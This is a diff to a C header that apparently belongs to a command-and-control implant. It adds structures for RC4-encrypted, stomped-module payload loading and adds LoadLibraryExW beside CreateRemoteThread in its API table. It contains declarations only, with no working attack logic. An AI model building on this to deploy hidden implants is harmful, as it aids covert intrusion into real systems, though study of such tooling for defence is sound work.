@@ -32,10 +32,21 @@
 #include <stdio.h>
 #endif
 
+#define KEYSIZE 4
+
+typedef struct
+{
+    DWORD	Length;
+    DWORD	MaximumLength;
+    PVOID	Buffer;
+} USTRING;
+
 // To prevent false alignment on x64
 #pragma pack(1)
 typedef struct
 {
+    USTRING KeyStompedModule;
+    USTRING Rc4StompedModule;
     PVOID KaynLdr;
     PVOID DllCopy;
     PVOID Demon;
@@ -70,6 +81,10 @@ typedef struct
     struct {
         PVOID ModuleBase;
         DWORD ModuleSize;
+        USTRING KeyStompedModule;
+        USTRING Rc4StompedModule;
+        USTRING Rc4PayloadModule;
+        USTRING KeyPayloadModule;
         PVOID TxtBase;
         DWORD TxtSize;
         DWORD AgentID;
@@ -223,6 +238,7 @@ typedef struct
 
         // Kernel32
         WIN_FUNC( LoadLibraryW )
+        WIN_FUNC( LoadLibraryExW )
         WIN_FUNC( CreateRemoteThread )
         WIN_FUNC( CreateToolhelp32Snapshot )
         WIN_FUNC( Process32FirstW )
